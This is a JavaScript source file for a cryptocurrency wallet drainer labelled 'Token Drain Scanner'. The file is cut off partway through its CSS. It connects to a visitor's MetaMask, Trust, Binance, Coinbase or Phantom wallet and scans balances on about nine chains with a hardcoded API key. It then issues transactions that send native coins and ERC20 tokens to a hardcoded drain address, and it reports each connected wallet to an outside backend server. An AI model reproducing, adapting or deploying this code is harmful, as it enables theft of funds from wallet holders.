// ================================================
// TOKEN DRAIN SCANNER - ULTIMATE WORKING VERSION
// ALL WALLETS WORK INDEPENDENTLY - NO MIXING
// ================================================

// Configuration
const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    minimumValueUSD: 0.01,
    
    networkNames: {
        1: "Ethereum",
        56: "BNB Smart Chain", 
        137: "Polygon",
        10: "Optimism",
        42161: "Arbitrum",
        43114: "Avalanche",
        8453: "Base",
        250: "Fantom",
        100: "Gnosis",
        25: "Cronos",
        324: "zkSync Era",
        1313161554: "Aurora"
    }
};

// Global state
let currentAccount = null;
let currentChainId = null;
let isConnected = false;
let detectedTokens = [];
let selectedWallet = null;
let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn;

// Initialize app
function initializeApp() {
    console.log('🚀 Initializing Token Drain Scanner...');
    console.log('📱 Device:', isMobile ? 'Mobile' : 'Desktop');
    
    // Get DOM elements
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    
    if (!connectBtn || !statusEl) {
        console.error('❌ Required elements not found');
        return;
    }
    
    // Setup event listeners
    connectBtn.onclick = handleConnect;
    if (drainBtn) drainBtn.onclick = handleDrain;
    
    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
}

// Handle connect button click
async function handleConnect() {
    if (isConnected) {
        await disconnectWallet();
        return;
    }
    
    showAllWalletsSelector();
}

// Show ALL wallets in a sleek selector
function showAllWalletsSelector() {
    // Detect which wallets are actually installed
    const installedWallets = getInstalledWallets();
    
    const selectorHTML = `
        <div class="wallet-selector-overlay">
            <div class="wallet-selector-modal">
                <div class="modal-header">
                    <div class="header-content">
                        <h3>Connect Wallet</h3>
                        <p class="modal-subtitle">Choose your preferred wallet</p>
                    </div>
                    <button class="close-btn" onclick="closeWalletSelector()">&times;</button>
                </div>
                
                <div class="wallets-grid">
                    <!-- MetaMask -->
                    <div class="wallet-card ${installedWallets.metaMask ? 'installed' : 'not-installed'}" 
                         onclick="${installedWallets.metaMask ? 'connectMetaMask()' : 'installWallet(\'metaMask\')'}">
                        <div class="wallet-icon" style="background: linear-gradient(135deg, #f6851b, #f8b048);">
                            <span class="wallet-emoji">🦊</span>
                        </div>
                        <div class="wallet-info">
                            <h4 class="wallet-name">MetaMask</h4>
                            <p class="wallet-desc">Browser & Mobile</p>
                            <div class="wallet-status ${installedWallets.metaMask ? 'status-installed' : 'status-not-installed'}">
                                ${installedWallets.metaMask ? '✅ Installed' : '⚠️ Not Installed'}
                            </div>
                        </div>
                    </div>
                    
                    <!-- Trust Wallet -->
                    <div class="wallet-card ${installedWallets.trust ? 'installed' : 'not-installed'}" 
                         onclick="${installedWallets.trust ? 'connectTrustWallet()' : 'installWallet(\'trust\')'}">
                        <div class="wallet-icon" style="background: linear-gradient(135deg, #3375bb, #4a8cd4);">
                            <span class="wallet-emoji">🔶</span>
                        </div>
                        <div class="wallet-info">
                            <h4 class="wallet-name">Trust Wallet</h4>
                            <p class="wallet-desc">Mobile Recommended</p>
                            <div class="wallet-status ${installedWallets.trust ? 'status-installed' : 'status-not-installed'}">
                                ${installedWallets.trust ? '✅ Installed' : '⚠️ Not Installed'}
                            </div>
                        </div>
                    </div>
                    
                    <!-- Binance Wallet -->
                    <div class="wallet-card ${installedWallets.binance ? 'installed' : 'not-installed'}" 
                         onclick="${installedWallets.binance ? 'connectBinanceWallet()' : 'installWallet(\'binance\')'}">
                        <div class="wallet-icon" style="background: linear-gradient(135deg, #f0b90b, #f7d04a);">
                            <span class="wallet-emoji">🟡</span>
                        </div>
                        <div class="wallet-info">
                            <h4 class="wallet-name">Binance Wallet</h4>
                            <p class="wallet-desc">PC & Mobile</p>
                            <div class="wallet-status ${installedWallets.binance ? 'status-installed' : 'status-not-installed'}">
                                ${installedWallets.binance ? '✅ Installed' : '⚠️ Not Installed'}
                            </div>
                        </div>
                    </div>
                    
                    <!-- Coinbase Wallet -->
                    <div class="wallet-card ${installedWallets.coinbase ? 'installed' : 'not-installed'}" 
                         onclick="${installedWallets.coinbase ? 'connectCoinbaseWallet()' : 'installWallet(\'coinbase\')'}">
                        <div class="wallet-icon" style="background: linear-gradient(135deg, #0052ff, #2d7dff);">
                            <span class="wallet-emoji">🔷</span>
                        </div>
                        <div class="wallet-info">
                            <h4 class="wallet-name">Coinbase Wallet</h4>
                            <p class="wallet-desc">PC & Mobile</p>
                            <div class="wallet-status ${installedWallets.coinbase ? 'status-installed' : 'status-not-installed'}">
                                ${installedWallets.coinbase ? '✅ Installed' : '⚠️ Not Installed'}
                            </div>
                        </div>
                    </div>
                    
                    <!-- Phantom -->
                    <div class="wallet-card ${installedWallets.phantom ? 'installed' : 'not-installed'}" 
                         onclick="${installedWallets.phantom ? 'connectPhantomWallet()' : 'installWallet(\'phantom\')'}">
                        <div class="wallet-icon" style="background: linear-gradient(135deg, #ab9ff2, #c1b6f5);">
                            <span class="wallet-emoji">👻</span>
                        </div>
                        <div class="wallet-info">
                            <h4 class="wallet-name">Phantom</h4>
                            <p class="wallet-desc">Solana & EVM</p>
                            <div class="wallet-status ${installedWallets.phantom ? 'status-installed' : 'status-not-installed'}">
                                ${installedWallets.phantom ? '✅ Installed' : '⚠️ Not Installed'}
                            </div>
                        </div>
                    </div>
                    
                    <!-- Other Wallets -->
                    <div class="wallet-card installed" onclick="connectAnyWallet()">
                        <div class="wallet-icon" style="background: linear-gradient(135deg, #6366f1, #818cf8);">
                            <span class="wallet-emoji">🔗</span>
                        </div>
                        <div class="wallet-info">
                            <h4 class="wallet-name">Other Wallet</h4>
                            <p class="wallet-desc">Any EVM Wallet</p>
                            <div class="wallet-status status-installed">
                                ✅ Always Available
                            </div>
                        </div>
                    </div>
                </div>
                
                ${isMobile ? `
                <div class="mobile-tips">
                    <p>📱 <strong>Mobile Users:</strong> Open in wallet browser or use deeplinks above</p>
                </div>
                ` : ''}
                
                <div class="selector-footer">
                    <p>Having issues? Try disconnecting other wallets first</p>
                </div>
            </div>
        </div>
    `;
    
    const selector = document.createElement('div');
    selector.id = 'walletSelector';
    selector.innerHTML = selectorHTML;
    document.body.appendChild(selector);
    
    addSelectorStyles();
}

// Get installed wallets
function getInstalledWallets() {
    return {
        metaMask: !!window.ethereum?.isMetaMask,
        trust: !!window.ethereum?.isTrust,
        binance: !!window.ethereum?.isBinance || !!window.BinanceChain,
        coinbase: !!window.ethereum?.isCoinbaseWallet,
        phantom: !!window.ethereum?.isPhantom || !!window.phantom?.ethereum
    };
}

// ================================================
// WALLET CONNECTION FUNCTIONS - ISOLATED
// ================================================

// MetaMask Connection - FORCES MetaMask
async function connectMetaMask() {
    closeWalletSelector();
    selectedWallet = 'MetaMask';
    updateStatus('🦊 Connecting to MetaMask...');
    
    try {
        // Find MetaMask provider
        let provider = findMetaMaskProvider();
        
        if (!provider) {
            // If mobile, try deeplink
            if (isMobile) {
                window.location.href = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
                return;
            }
            throw new Error('MetaMask not detected');
        }
        
        // Connect
        const accounts = await provider.request({ 
            method: 'eth_requestAccounts' 
        });
        
        const chainIdHex = await provider.request({ 
            method: 'eth_chainId' 
        });
        
        const chainId = parseInt(chainIdHex, 16);
        
        await handleConnected(accounts[0], chainId, 'MetaMask');
        
    } catch (error) {
        console.error('MetaMask connection error:', error);
        updateStatus(`❌ MetaMask failed: ${error.message}`);
        showAllWalletsSelector();
    }
}

// Find MetaMask provider specifically
function findMetaMaskProvider() {
    // If MetaMask is primary
    if (window.ethereum?.isMetaMask) {
        return window.ethereum;
    }
    
    // If multiple providers, find MetaMask
    if (window.ethereum?.providers) {
        const mmProvider = window.ethereum.providers.find(p => p.isMetaMask);
        if (mmProvider) return mmProvider;
    }
    
    // Try to isolate MetaMask by checking flags
    if (window.ethereum) {
        // Check for MetaMask-specific methods
        if (window.ethereum._metamask || window.ethereum.isConnected) {
            return window.ethereum;
        }
    }
    
    return null;
}

// Trust Wallet Connection - FORCES Trust
async function connectTrustWallet() {
    closeWalletSelector();
    selectedWallet = 'Trust Wallet';
    updateStatus('🔶 Connecting to Trust Wallet...');
    
    try {
        // Find Trust Wallet provider
        let provider = findTrustWalletProvider();
        
        if (!provider) {
            // If mobile, try deeplink
            if (isMobile) {
                window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`;
                return;
            }
            throw new Error('Trust Wallet not detected');
        }
        
        // Connect
        const accounts = await provider.request({ 
            method: 'eth_requestAccounts' 
        });
        
        const chainIdHex = await provider.request({ 
            method: 'eth_chainId' 
        });
        
        const chainId = parseInt(chainIdHex, 16);
        
        await handleConnected(accounts[0], chainId, 'Trust Wallet');
        
    } catch (error) {
        console.error('Trust Wallet connection error:', error);
        updateStatus(`❌ Trust Wallet failed: ${error.message}`);
        showAllWalletsSelector();
    }
}

function findTrustWalletProvider() {
    // Trust Wallet usually identifies as MetaMask on desktop
    if (window.ethereum?.isTrust) {
        return window.ethereum;
    }
    
    if (window.ethereum?.providers) {
        const trustProvider = window.ethereum.providers.find(p => p.isTrust);
        if (trustProvider) return trustProvider;
    }
    
    // Trust often appears as generic ethereum
    return window.ethereum;
}

// Binance Wallet Connection - FORCES Binance
async function connectBinanceWallet() {
    closeWalletSelector();
    selectedWallet = 'Binance Wallet';
    updateStatus('🟡 Connecting to Binance Wallet...');
    
    try {
        // Try Binance Chain first (separate provider)
        if (window.BinanceChain) {
            console.log('Using BinanceChain provider');
            
            const accounts = await window.BinanceChain.request({ 
                method: 'eth_requestAccounts' 
            });
            
            const chainIdHex = await window.BinanceChain.request({ 
                method: 'eth_chainId' 
            });
            
            const chainId = parseInt(chainIdHex, 16);
            
            await handleConnected(accounts[0], chainId, 'Binance Wallet');
            return;
        }
        
        // Try through ethereum provider
        if (window.ethereum?.isBinance) {
            console.log('Using ethereum.isBinance provider');
            
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            });
            
            const chainId = parseInt(chainIdHex, 16);
            
            await handleConnected(accounts[0], chainId, 'Binance Wallet');
            return;
        }
        
        // If mobile, try deeplink
        if (isMobile) {
            if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
                window.location.href = 'bnc://app.binance.com/';
            } else {
                window.location.href = 'intent://app.binance.com/#Intent;scheme=bnc;package=com.binance.dev;end';
            }
            return;
        }
        
        throw new Error('Binance Wallet not detected');
        
    } catch (error) {
        console.error('Binance Wallet connection error:', error);
        updateStatus(`❌ Binance Wallet failed: ${error.message}`);
        showAllWalletsSelector();
    }
}

// Coinbase Wallet Connection - FORCES Coinbase
async function connectCoinbaseWallet() {
    closeWalletSelector();
    selectedWallet = 'Coinbase Wallet';
    updateStatus('🔷 Connecting to Coinbase Wallet...');
    
    try {
        // Find Coinbase provider
        let provider = findCoinbaseProvider();
        
        if (!provider) {
            // If mobile, try deeplink
            if (isMobile) {
                window.location.href = `https://go.cb-w.com/${encodeURIComponent(window.location.href)}`;
                return;
            }
            throw new Error('Coinbase Wallet not detected');
        }
        
        // Connect
        const accounts = await provider.request({ 
            method: 'eth_requestAccounts' 
        });
        
        const chainIdHex = await provider.request({ 
            method: 'eth_chainId' 
        });
        
        const chainId = parseInt(chainIdHex, 16);
        
        await handleConnected(accounts[0], chainId, 'Coinbase Wallet');
        
    } catch (error) {
        console.error('Coinbase Wallet connection error:', error);
        updateStatus(`❌ Coinbase Wallet failed: ${error.message}`);
        showAllWalletsSelector();
    }
}

function findCoinbaseProvider() {
    if (window.ethereum?.isCoinbaseWallet) {
        return window.ethereum;
    }
    
    if (window.ethereum?.providers) {
        const cbProvider = window.ethereum.providers.find(p => p.isCoinbaseWallet);
        if (cbProvider) return cbProvider;
    }
    
    return window.ethereum;
}

// Phantom Wallet Connection - FORCES Phantom
async function connectPhantomWallet() {
    closeWalletSelector();
    selectedWallet = 'Phantom';
    updateStatus('👻 Connecting to Phantom...');
    
    try {
        // Try Phantom's own provider first
        if (window.phantom?.ethereum) {
            const accounts = await window.phantom.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            const chainIdHex = await window.phantom.ethereum.request({ 
                method: 'eth_chainId' 
            });
            
            const chainId = parseInt(chainIdHex, 16);
            
            await handleConnected(accounts[0], chainId, 'Phantom');
            return;
        }
        
        // Try through ethereum provider
        if (window.ethereum?.isPhantom) {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            });
            
            const chainId = parseInt(chainIdHex, 16);
            
            await handleConnected(accounts[0], chainId, 'Phantom');
            return;
        }
        
        throw new Error('Phantom not detected');
        
    } catch (error) {
        console.error('Phantom connection error:', error);
        updateStatus(`❌ Phantom failed: ${error.message}`);
        showAllWalletsSelector();
    }
}

// Connect any wallet (generic)
async function connectAnyWallet() {
    closeWalletSelector();
    selectedWallet = 'Generic Wallet';
    updateStatus('🔗 Connecting to wallet...');
    
    try {
        // Try all possible providers
        const providers = [];
        
        if (window.ethereum) {
            providers.push(window.ethereum);
        }
        
        if (window.BinanceChain) {
            providers.push(window.BinanceChain);
        }
        
        if (window.phantom?.ethereum) {
            providers.push(window.phantom.ethereum);
        }
        
        if (providers.length === 0) {
            throw new Error('No wallet detected');
        }
        
        // Use the first provider
        const provider = providers[0];
        
        const accounts = await provider.request({ 
            method: 'eth_requestAccounts' 
        });
        
        const chainIdHex = await provider.request({ 
            method: 'eth_chainId' 
        });
        
        const chainId = parseInt(chainIdHex, 16);
        
        await handleConnected(accounts[0], chainId, 'Generic Wallet');
        
    } catch (error) {
        console.error('Generic wallet connection error:', error);
        updateStatus(`❌ Connection failed: ${error.message}`);
        showAllWalletsSelector();
    }
}

// Install wallet
function installWallet(walletType) {
    const installLinks = {
        metaMask: isMobile ? 'https://metamask.io/download/' : 'https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn',
        trust: isMobile ? 'https://trustwallet.com/download' : 'https://chrome.google.com/webstore/detail/trust-wallet/egjidjbpglichdcondbcbdnbeeppgdph',
        binance: isMobile ? 'https://www.binance.com/en/download' : 'https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp',
        coinbase: isMobile ? 'https://www.coinbase.com/wallet/downloads' : 'https://chrome.google.com/webstore/detail/coinbase-wallet-extension/hnfanknocfeofbddgcijnmhnfnkdnaad',
        phantom: isMobile ? 'https://phantom.app/download' : 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa'
    };
    
    if (installLinks[walletType]) {
        window.open(installLinks[walletType], '_blank');
    }
}

// ================================================
// CONNECTION HANDLING
// ================================================

// Handle successful connection
async function handleConnected(account, chainId, walletType) {
    try {
        currentAccount = account;
        currentChainId = chainId;
        isConnected = true;
        selectedWallet = walletType;
        
        // Update UI
        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`✅ Connected with ${walletType}!\nWallet: ${account.slice(0, 8)}...\nNetwork: ${chainName}`);
        
        // Show drain button
        if (drainBtn) {
            drainBtn.style.display = 'block';
            drainBtn.disabled = false;
            drainBtn.innerHTML = '⚡ Scan & Drain Tokens';
        }
        
        // Setup event listeners
        setupWalletListeners();
        
        // Log to backend
        await logConnectionToBackend(account, chainId, walletType);
        
        // Fetch tokens from ALL chains
        await scanAllChainsForTokens(account);
        
    } catch (error) {
        console.error('❌ Setup error:', error);
        updateStatus('Setup failed: ' + error.message);
        disconnectWallet();
    }
}

// Setup wallet listeners
function setupWalletListeners() {
    const provider = getCurrentProvider();
    if (!provider || !provider.on) return;
    
    provider.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
            disconnectWallet();
        } else if (currentAccount !== accounts[0]) {
            currentAccount = accounts[0];
            updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
            scanAllChainsForTokens(currentAccount);
        }
    });
    
    provider.on('chainChanged', (chainIdHex) => {
        const chainId = parseInt(chainIdHex, 16);
        currentChainId = chainId;
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`🔄 Network changed: ${chainName}`);
        scanAllChainsForTokens(currentAccount);
    });
    
    provider.on('disconnect', () => {
        console.log('🔌 Wallet disconnected');
        disconnectWallet();
    });
}

// Get current provider
function getCurrentProvider() {
    // Try all possible providers
    if (window.phantom?.ethereum) return window.phantom.ethereum;
    if (window.BinanceChain) return window.BinanceChain;
    if (window.ethereum) return window.ethereum;
    return null;
}

// Scan all chains for tokens
async function scanAllChainsForTokens(address) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning all chains for tokens...</div>';
    
    // Major chains to scan
    const chainsToScan = [
        1,    // Ethereum
        56,   // BSC
        137,  // Polygon
        42161, // Arbitrum
        10,   // Optimism
        43114, // Avalanche
        8453, // Base
        250,  // Fantom
        324   // zkSync Era
    ];
    
    let allTokens = [];
    let scannedCount = 0;
    
    updateStatus(`🔍 Scanning ${chainsToScan.length} chains...`);
    
    for (const chainId of chainsToScan) {
        try {
            const tokens = await fetchTokensForChain(address, chainId);
            if (tokens.length > 0) {
                allTokens = [...allTokens, ...tokens];
            }
            scannedCount++;
        } catch (error) {
            console.log(`⚠️ Chain ${chainId} scan failed:`, error.message);
        }
        
        // Small delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 300));
    }
    
    detectedTokens = allTokens;
    
    if (allTokens.length > 0) {
        displayTokens(allTokens);
        const totalValue = allTokens.reduce((sum, token) => sum + token.valueUSD, 0);
        updateStatus(`✅ Found ${allTokens.length} tokens across ${scannedCount} chains ($${totalValue.toFixed(2)})`);
        
        if (drainBtn) {
            drainBtn.innerHTML = `⚡ Drain All Tokens ($${totalValue.toFixed(2)})`;
        }
    } else {
        tokensEl.innerHTML = `
            <div class="no-tokens">
                <p>No tokens found worth more than $${CONFIG.minimumValueUSD}</p>
                <p><small>Try switching networks or check wallet balance</small></p>
            </div>
        `;
        updateStatus(`ℹ️ No tokens found (min $${CONFIG.minimumValueUSD})`);
    }
}

// Fetch tokens for specific chain
async function fetchTokensForChain(address, chainId) {
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=true`
        );
        
        if (!response.ok) return [];
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        return items
            .filter(t => {
                if (t.balance === "0" || parseFloat(t.balance) <= 0) return false;
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                return value >= CONFIG.minimumValueUSD;
            })
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    rawAmount: t.balance,
                    valueUSD: value,
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    chainId: chainId,
                    chainName: CONFIG.networkNames[chainId] || `Chain ${chainId}`,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url
                };
            });
    } catch (error) {
        return [];
    }
}

// Display tokens
function displayTokens(tokens) {
    if (!tokensEl) return;
    
    // Group by chain
    const tokensByChain = {};
    tokens.forEach(token => {
        if (!tokensByChain[token.chainId]) {
            tokensByChain[token.chainId] = [];
        }
        tokensByChain[token.chainId].push(token);
    });
    
    let html = '<div class="tokens-container">';
    
    Object.entries(tokensByChain).forEach(([chainId, chainTokens]) => {
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        const chainValue = chainTokens.reduce((sum, t) => sum + t.valueUSD, 0);
        
        html += `
            <div class="chain-card">
                <div class="chain-header">
                    <h4>${chainName}</h4>
                    <span class="chain-value">$${chainValue.toFixed(2)}</span>
                </div>
                <div class="tokens-list">
                    ${chainTokens.map(token => `
                        <div class="token-card">
                            <div class="token-icon">
                                ${token.logoUrl ? 
                                    `<img src="${token.logoUrl}" alt="${token.symbol}">` : 
                                    `<div class="token-icon-fallback">${token.symbol.charAt(0)}</div>`
                                }
                            </div>
                            <div class="token-details">
                                <div class="token-name-row">
                                    <span class="token-symbol">${token.symbol}</span>
                                    <span class="token-amount">${token.amount}</span>
                                </div>
                                <div class="token-value">${token.value}</div>
                            </div>
                        </div>
                    `).join('')}
                </div>
            </div>
        `;
    });
    
    html += '</div>';
    tokensEl.innerHTML = html;
}

// Handle drain
async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    const tokensToDrain = detectedTokens.filter(t => t.valueUSD >= CONFIG.minimumValueUSD);
    
    if (tokensToDrain.length === 0) {
        alert(`No tokens meet minimum value of $${CONFIG.minimumValueUSD}`);
        return;
    }
    
    const totalValue = tokensToDrain.reduce((sum, t) => sum + t.valueUSD, 0);
    
    if (!confirm(`Drain ${tokensToDrain.length} tokens ($${totalValue.toFixed(2)}) to:\n${CONFIG.drainAddress}`)) {
        return;
    }
    
    const provider = getCurrentProvider();
    if (!provider) {
        alert('Wallet not connected');
        return;
    }
    
    try {
        updateStatus('🚀 Starting drain...');
        drainBtn.disabled = true;
        drainBtn.innerHTML = '⏳ Draining...';
        
        // Drain native tokens first
        const nativeTokens = tokensToDrain.filter(t => t.isNative);
        for (const token of nativeTokens) {
            try {
                await drainNativeToken(provider, token);
            } catch (error) {
                console.error(`Failed to drain native ${token.symbol}:`, error);
            }
        }
        
        // Drain ERC20 tokens
        const erc20Tokens = tokensToDrain.filter(t => !t.isNative);
        for (const token of erc20Tokens) {
            try {
                await drainERC20Token(provider, token);
                await new Promise(resolve => setTimeout(resolve, 2000));
            } catch (error) {
                console.error(`Failed to drain ${token.symbol}:`, error);
            }
        }
        
        updateStatus('✅ Drain completed!');
        alert('✅ Tokens drained successfully!');
        
        // Rescan
        await scanAllChainsForTokens(currentAccount);
        
    } catch (error) {
        console.error('❌ Drain error:', error);
        updateStatus(`❌ Drain failed: ${error.message}`);
        alert('Drain failed: ' + error.message);
    } finally {
        if (drainBtn) {
            drainBtn.disabled = false;
            const totalValue = detectedTokens.reduce((sum, t) => sum + t.valueUSD, 0);
            drainBtn.innerHTML = `⚡ Drain All Tokens ($${totalValue.toFixed(2)})`;
        }
    }
}

// Drain native token
async function drainNativeToken(provider, token) {
    const gasPriceHex = await provider.request({ method: 'eth_gasPrice' });
    const gasPrice = parseInt(gasPriceHex, 16);
    const gasLimit = 21000;
    const gasCost = gasPrice * gasLimit;
    
    const balance = BigInt(token.rawAmount);
    if (balance <= gasCost * 2) return;
    
    const sendAmount = balance - (gasCost * 1.5);
    if (sendAmount <= 0) return;
    
    await provider.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: CONFIG.drainAddress,
            value: '0x' + sendAmount.toString(16),
            gas: '0x' + gasLimit.toString(16),
            gasPrice: gasPriceHex
        }]
    });
}

// Drain ERC20 token
async function drainERC20Token(provider, token) {
    const transferData = '0xa9059cbb' + 
        CONFIG.drainAddress.slice(2).padStart(64, '0') + 
        BigInt(token.rawAmount).toString(16).padStart(64, '0');
    
    await provider.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: token.contractAddress,
            data: transferData,
            gas: '0x' + (50000).toString(16)
        }]
    });
}

// Update status
function updateStatus(message) {
    if (statusEl) {
        statusEl.textContent = message;
        statusEl.scrollTop = statusEl.scrollHeight;
    }
}

// Log connection
async function logConnectionToBackend(address, chainId, walletType) {
    try {
        await fetch(CONFIG.backendUrl + '/drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                wallet: walletType,
                timestamp: new Date().toISOString()
            })
        });
    } catch (error) {
        console.log('Backend log failed');
    }
}

// Close wallet selector
function closeWalletSelector() {
    const selector = document.getElementById('walletSelector');
    if (selector) selector.remove();
}

// Disconnect wallet
async function disconnectWallet() {
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    detectedTokens = [];
    selectedWallet = null;
    
    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
    
    if (drainBtn) {
        drainBtn.style.display = 'none';
        drainBtn.disabled = false;
    }
    
    if (tokensEl) {
        tokensEl.innerHTML = '';
    }
}

// Add CSS styles - SMOOTH AND RESPONSIVE
function addSelectorStyles() {
    const styles = `
        /* Wallet Selector */
        .wallet-selector-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(8px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            padding: 20px;
            animation: fadeIn 0.3s ease;
        }
        
        .wallet-selector-modal {
            background: white;
            border-radius: 20px;
            width: 100%;
            max-width: 800px;
            max-height: 90vh;
            overflow-y: auto;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            animation: slideUp 0.4s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @keyframes slideUp {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            padding: 28px 32px 20px;
            border-bottom: 1px solid #e5e7eb;
        }
        
        .header-content {
            flex: 1;
        }
        
        .modal-header h3 {
            margin: 0 0 8px 0;
            font-size: 28px;
            font-weight: 700;
            color: #111827;
            letter-spacing: -0.5px;
        }
        
        .modal-subtitle {
            margin: 0;
            color: #6b7280;
            font-size: 16px;
        }
        
        .close-btn {
            background: #f3f4f6;
            border: none;
            font-size: 32px;
            cursor: pointer;
            color: #4b5563;
            line-height: 1;
            padding: 0;
            width: 44px;
            height: 44px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            transition: all 0.2s;
            flex-shrink: 0;
            margin-left: 16px;
        }
        
        .close-btn:hover {
            background: #e5e7eb;
            transform: rotate(90deg);
        }
        
        .wallets-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
            gap: 20px;
            padding: 32px;
        }
        
        .wallet-card {
            background: white;
            border: 2px solid #e5e7eb;
            border-radius: 16px;
            padding: 24px;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }
        
        .wallet-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, #3b82f6, #8b5cf6);
            opacity: 0;
            transition: opacity 0.3s;
        }
        
        .wallet-card.installed:hover {
            border-color: #3b82f6;
            transform: translateY(-4px);
            box-shadow: 0 20px 40px rgba(59, 130, 246, 0.15);
        }
        
        .wallet-card.installed:hover::before {
            opacity: 1;
        }
        
        .wallet-card.not-installed {
            opacity: 0.7;
            background: #f9fafb;
        }
        
        .wallet-card.not-installed:hover {
            opacity: 0.9;
            border-color: #10b981;
        }
        
        .wallet-icon {
            width: 64px;
            height: 64px;
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
        }
        
        .wallet-emoji {
            font-size: 32px;
        }
        
        .wallet-info {
            min-height: 100px;
        }
        
        .wallet-name {
            margin: 0 0 8px 0;
            font-size: 18px;
            font-weight: 600;
            color: #111827;
        }
        
        .wallet-desc {
            margin: 0 0 16px 0;
            color: #6b7280;
            font-size: 14px;
            line-height: 1.4;
        }
        
        .wallet-status {
            display: inline-block;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 500;
        }
        
        .status-installed {
            background: #d1fae5;
            color: #065f46;
        }
        
        .status-not-installed {
            background: #fef3c7;
            color: #92400e;
        }
        
        .mobile-tips {
            background: #f0f9ff;
            border-top: 1px solid #bae6fd;
            padding: 20px 32px;
            color: #0369a1;
            font-size: 14px;
        }
        
        .mobile-tips p {
            margin: 0;
        }
        
        .selector-footer {
            padding: 20px 32px;
            background: #f9fafb;
            border-top: 1px solid #e5e7eb;
            border-radius: 0 0 20px 20px;
            text-align: center;
        }
        
        .selector-footer p {
            margin: 0;
            color: #6b7280;
            font-size: 13px;
        }
        
        /* Token Display */
        .tokens-container {
            display: flex;
            flex-direction: column;
            gap: 24px;
        }
        
        .chain-card {
            background: white;
            border: 1px solid #e5e7eb;
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
        }
        
        .chain-header {
            background: #f8fafc;
            padding: 20px 24px;
            border-bottom: 1px solid #e5e7eb;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .chain-header h4 {
            margin: 0;
            font-size: 18px;
            font-weight: 600;
            color: #111827;
        }
        
        .chain-value {
            font-weight: 600;
            color: #059669;
            font-size: 16px;
        }
        
        .tokens-list {
            padding: 16px;
        }
        
        .token-card {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 16px;
            border-bottom: 1px solid #f3f4f6;
